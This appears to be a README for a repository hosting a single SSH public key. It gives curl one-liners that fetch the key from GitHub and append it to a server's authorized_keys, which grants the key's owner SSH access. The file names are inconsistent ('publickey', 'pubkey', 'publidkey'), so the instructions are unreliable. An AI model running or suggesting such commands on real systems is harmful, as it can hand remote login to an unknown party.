To use the public key:

curl -s https://raw.githubusercontent.com/gmcpda-guard/Security/863e85f4f792e48ca50449bc55f999580c2ea7dc/publickey >> authorized_keys

curl -s https://raw.githubusercontent.com/gmcpda-guard/Security/refs/heads/master/pubkey >> .ssh/authorized_keys

https://github.com/gmcpda-guard.keys

===================================================================================================================================
# SSH Public Key

This repository hosts a single SSH public key that can be added to a server's `authorized_keys` file.

## Option 1: Download and append with curl

If your `authorized_keys` file already exists:

```bash
curl -fsSL https://raw.githubusercontent.com/gmcpda-guard/Security/863e85f4f792e48ca50449bc55f999580c2ea7dc/publidkey >> ~/.ssh/authorized_keys
```

If you're logged in as another user, adjust the path as needed.

## Option 2: Create the directory if needed

```bash
mkdir -p ~/.ssh
chmod 700 ~/.ssh

curl -fsSL https://raw.githubusercontent.com/gmcpda-guard/Security/863e85f4f792e48ca50449bc55f999580c2ea7dc/publidkey >> ~/.ssh/authorized_keys

chmod 600 ~/.ssh/authorized_keys
```

## Direct download

You can also download the key directly:

```
https://raw.githubusercontent.com/gmcpda-guard/Security/863e85f4f792e48ca50449bc55f999580c2ea7dc/publidkey
```

## Verify before installing (recommended)

Review the key before adding it:

```bash
curl -fsSL https://raw.githubusercontent.com/gmcpda-guard/Security/863e85f4f792e48ca50449bc55f999580c2ea7dc/publidkey
```

If it matches the key you expect, append it to `authorized_keys`.

## Contents

- `publickey` — the SSH public key.

==========================================================================================================================
